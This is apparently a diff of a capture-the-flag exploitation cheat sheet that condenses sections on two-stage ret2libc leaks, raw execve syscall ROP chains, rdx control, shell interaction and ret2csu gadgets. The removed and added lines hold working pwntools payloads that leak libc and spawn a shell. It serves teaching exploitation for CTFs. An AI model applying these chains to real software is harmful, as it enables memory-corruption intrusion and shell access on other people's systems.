@@ -8,181 +8,41 @@ For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, s
 
 ```python
 from pwn import *
-
-elf = ELF('./binary')
-libc = ELF('./libc.so.6')
+elf, libc = ELF('./binary'), ELF('./libc.so.6')
 rop = ROP(elf)
-
-# Common gadgets
-pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-ret = rop.find_gadget(['ret'])[0]
-
-# Leak libc
-payload = flat(
-    b'A' * offset,
-    pop_rdi,
-    elf.got['puts'],
-    elf.plt['puts'],
-    elf.symbols['main']
-)
+pop_rdi, ret = rop.find_gadget(['pop rdi', 'ret'])[0], rop.find_gadget(['ret'])[0]
+payload = flat(b'A' * offset, pop_rdi, elf.got['puts'], elf.plt['puts'], RET2)
 ```
 
-### Two-Stage ret2libc (Leak + Shell)
+**The return target after the leak decides whether stage 2 survives.** Return to the `call vuln` instruction inside `main`: the CALL pushes a valid return address and rebuilds the frame exactly as on the first pass. `main`'s entry re-runs init/`check_status` and can reset state the exploit already consumed; entering `vuln` directly leaves `rsp` misaligned for the next libc call.
 
-When exploiting in two stages, choose the return target for stage 2 carefully:
+**Leak without a trailing newline.** When `printf` omits the trailing newline, the leaked bytes land straight after the text, so `recvline` reads them glued to the prefix - take a fixed width instead:
 
 ```python
-# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
-payload1 = b'A' * offset
-payload1 += p64(pop_rdi)
-payload1 += p64(elf.got['puts'])
-payload1 += p64(elf.plt['puts'])
-payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main
-
-# IMPORTANT: Return target after leak
-# - Returning to main may crash if check_status/setup corrupts stack
-# - Returning to vuln directly may have stack issues
-# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
-#   This sets up a clean stack frame via the CALL instruction
-```
-
-**Leak parsing with no-newline printf:**
-```python
-# If printf("Laundry complete") has no trailing newline,
-# puts() leak appears right after it on the same line:
-# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
-p.recvuntil(b'Laundry complete')
-leaked = p.recvline().strip()
-libc_addr = u64(leaked.ljust(8, b'\x00'))
+io.recvuntil(b'Laundry complete')
+leak = u64(io.recv(6).ljust(8, b'\x00'))
 ```
 
 ### Raw Syscall ROP (When system() Fails)
 
-If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:
-
-```python
-# Find gadgets in libc
-libc_rop = ROP(libc)
-pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
-pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
-pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
-pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
-syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]
-
-# execve("/bin/sh", NULL, NULL) = syscall 59
-payload = b'A' * offset
-payload += p64(libc_base + pop_rax)
-payload += p64(59)
-payload += p64(libc_base + pop_rdi)
-payload += p64(libc_base + next(libc.search(b'/bin/sh')))
-payload += p64(libc_base + pop_rsi)
-payload += p64(0)
-payload += p64(libc_base + pop_rdx_rbx)
-payload += p64(0)
-payload += p64(0)  # rbx junk
-payload += p64(libc_base + syscall_ret)
-```
-
-**When to use raw syscall vs libc functions:**
-- `system()` through libc: simplest, but may crash due to stack alignment or CET
-- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
-- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
-- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead
+When a libc call crashes under CET/IBT or bad alignment, end the chain through the `syscall` instruction: `pop rax` = 59, `pop rdi` = `"/bin/sh"`, `pop rsi` = 0, `pop rdx; pop rbx; ret` (plain `pop rdx; ret` is rare in modern libc), then `syscall; ret`. It skips every libc prologue and is the most reliable ending.
 
 ### rdx Control in ROP Chains
 
-After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.
-
-**Solutions:**
-1. **pop rdx gadget from libc** -- `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
-2. **Re-enter binary's read setup** -- Jump to code that sets `rdx` before `read`:
-   ```python
-   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
-   # Set rbp first so rbp-0x40 points to target buffer:
-   POP_RBP_RET = 0x40113d
-   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]
-
-   payload += p64(POP_RBP_RET)
-   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
-   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
-   # WARNING: After read, code continues to printf + leave;ret
-   # leave sets rsp=rbp, so you get a stack pivot to rbp!
-   ```
-3. **Stack pivot via leave;ret** -- When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.
+`puts` and friends clobber `rdx` to a small value, breaking a following `read(fd, buf, rdx)`. Three fixes: a `pop rdx; pop rbx; ret` gadget from libc; re-entering the binary's own `read` setup (`lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; ...`) after setting `rbp` with `pop rbp; ret` - the `leave;ret` after that read pivots `rsp` to `rbp`, so put the next chain at `rbp+8`; or use that `leave;ret` as a deliberate pivot.
 
 ### Shell Interaction After execve
 
-After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.
+The shell inherits stdin, so commands sent immediately can be eaten by a pending `read`. Sleep ~1s after the payload, then `sendline` one command at a time and `recv` with a timeout - do not batch-pipe.
 
-```python
-p.send(payload)  # Trigger execve
+## ret2csu — `__libc_csu_init` Gadgets
 
-# Wait for shell to initialize before sending commands
-import time
-time.sleep(1)
-p.sendline(b'id')
-time.sleep(0.5)
-result = p.recv(timeout=3)
+Two gadgets: the pop chain (`pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`) and the mover (`mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]; add rbx,1; cmp rbp,rbx; jne`). Set `rbx = 0`, `rbp = 1`, and `r12` to a *memory* slot holding the target address (a GOT entry, or a pointer array in `.bss`) - `r12` is dereferenced, never called directly.
 
-# For flag retrieval:
-p.sendline(b'cat /flag* flag* 2>/dev/null')
-time.sleep(0.5)
-flag = p.recv(timeout=3)
+Two traps decide the payload:
 
-# DON'T pipe commands via stdin when using pwntools - they get consumed
-# by earlier read() calls. Use explicit sendline() after delays instead.
-```
-
-## ret2csu — __libc_csu_init Gadgets (Crypto-Cat)
-
-**When to use:** Need to control `rdx`, `rsi`, and `edi` for a function call but no direct `pop rdx` gadget exists in the binary. `__libc_csu_init` is present in nearly all dynamically linked ELF binaries and contains two useful gadget sequences.
-
-**Gadget 1 (pop chain):** At the end of `__libc_csu_init`:
-```asm
-pop rbx        ; 0
-pop rbp        ; 1
-pop r12        ; function pointer (address of GOT entry)
-pop r13        ; edi value
-pop r14        ; rsi value
-pop r15        ; rdx value
-ret
-```
-
-**Gadget 2 (call + set registers):** Earlier in `__libc_csu_init`:
-```asm
-mov rdx, r15   ; rdx = r15
-mov rsi, r14   ; rsi = r14
-mov edi, r13d  ; edi = r13 (32-bit!)
-call [r12 + rbx*8]  ; call function pointer
-add rbx, 1
-cmp rbp, rbx
-jne .loop      ; loop if rbx != rbp
-; falls through to gadget 1 pop chain
-```
-
-**Exploit pattern:**
-```python
-csu_pop = elf.symbols['__libc_csu_init'] + OFFSET_TO_POP_CHAIN
-csu_call = elf.symbols['__libc_csu_init'] + OFFSET_TO_MOV_CALL
-
-payload = flat(
-    b'A' * offset,
-    csu_pop,
-    0,            # rbx = 0 (index)
-    1,            # rbp = 1 (loop count, must equal rbx+1)
-    elf.got['puts'],  # r12 = function to call (GOT entry)
-    0xdeadbeef,   # r13 → edi (first arg, 32-bit only!)
-    0xcafebabe,   # r14 → rsi (second arg)
-    0x12345678,   # r15 → rdx (third arg)
-    csu_call,     # trigger mov + call
-    b'\x00' * 56, # padding for the 7 pops after call returns
-    next_gadget,  # return address after csu completes
-)
-```
-
-**Limitations:** `edi` is set via `mov edi, r13d` — only the lower 32 bits are written. For 64-bit first arguments, use a `pop rdi; ret` gadget instead. The function is called via `call [r12 + rbx*8]` — an indirect call through a pointer, so `r12` must point to a GOT entry or other memory containing the target address.
-
-**Key insight:** ret2csu provides universal gadgets for setting up to 3 arguments (`rdi`, `rsi`, `rdx`) and calling any function via its GOT entry, without needing libc gadgets. Useful when the binary is statically small but dynamically linked.
+- **`edi` is 32-bit.** `mov edi, r13d` zero-extends, so a libc address as the first argument needs a real `pop rdi; ret`.
+- **The call returns into the pop chain**, so the seven qwords after `call` are consumed as `rbx/rbp/r12-r15` plus a return - pad 56 bytes before the next gadget.
 
 ---
 
